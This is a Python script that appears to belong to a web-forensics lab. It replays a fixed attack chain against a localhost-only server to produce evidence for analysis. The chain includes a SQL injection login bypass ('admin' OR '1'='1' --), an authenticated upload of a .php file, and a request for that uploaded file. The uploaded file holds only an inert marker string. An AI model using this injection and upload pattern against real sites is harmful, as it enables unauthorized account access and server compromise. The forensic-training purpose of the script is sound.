"""Replay the fixed localhost-only Scenario B POST login chain."""

import http.cookiejar
import time
import urllib.error
import urllib.parse
import urllib.request

from common import STEP_DELAY_SECONDS, start_fresh_lab

BASE = "http://127.0.0.1:8081"
USER_AGENT = "webforensics-lab/1.0 scenario-b"
ATTACKER = "192.0.2.10"
MARKER = b"LAB-FORENSICS-MARKER-B-v1\n"


def request(opener, path, client_ip, *, data=None, content_type=None, status=200):
    headers = {"User-Agent": USER_AGENT, "X-Lab-Client-IP": client_ip}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(BASE + path, data=data, headers=headers)
    try:
        with opener.open(req, timeout=10) as response:
            code, body = response.status, response.read()
    except urllib.error.HTTPError as response:
        code, body = response.code, response.read()
    except urllib.error.URLError as exc:
        raise RuntimeError(f"localhost lab request failed for {path}: {exc}") from exc
    if code != status:
        raise RuntimeError(f"expected HTTP {status}, received {code} for {path}")
    return body


def run():
    start_fresh_lab()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
    )
    steps = [
        lambda: request(
            opener,
            "/admin/login.php",
            ATTACKER,
            data=urllib.parse.urlencode(
                {"username": "admin", "password": "wrong-lab-password"}
            ).encode(),
            content_type="application/x-www-form-urlencoded",
            status=401,
        ),
        lambda: request(opener, "/", "198.51.100.20"),
        lambda: request(opener, "/product.php?id=2", "203.0.113.20"),
    ]
    username = "admin' OR '1'='1' -- "
    steps.extend(
        [
            lambda: request(
                opener,
                "/admin/login.php",
                ATTACKER,
                data=urllib.parse.urlencode({"username": username, "password": ""}).encode(),
                content_type="application/x-www-form-urlencoded",
            ),
        ]
    )
    boundary = "----webforensics-lab-scenario-b"
    upload = (
        (
            f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
            'filename="scenario-b-marker.php"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
        + MARKER
        + f"\r\n--{boundary}--\r\n".encode()
    )
    steps.extend(
        [
            lambda: request(
                opener,
                "/admin/auth_upload.php",
                ATTACKER,
                data=upload,
                content_type=f"multipart/form-data; boundary={boundary}",
            ),
            lambda: request(opener, "/uploads/scenario-b-marker.php", ATTACKER),
        ]
    )
    for i, step in enumerate(steps):
        body = step()
        if i == 3 and b"Login successful" not in body:
            raise RuntimeError("POST SQLi login did not establish the lab session")
        if i == 4 and b"/uploads/scenario-b-marker.php" not in body:
            raise RuntimeError("authenticated upload did not confirm marker path")
        if i == 5 and body != MARKER:
            raise RuntimeError("marker request did not return expected inert text")
        if i < len(steps) - 1:
            time.sleep(STEP_DELAY_SECONDS)
    print("Scenario B replay complete: six fixed requests through the loopback edge.")


if __name__ == "__main__":
    run()
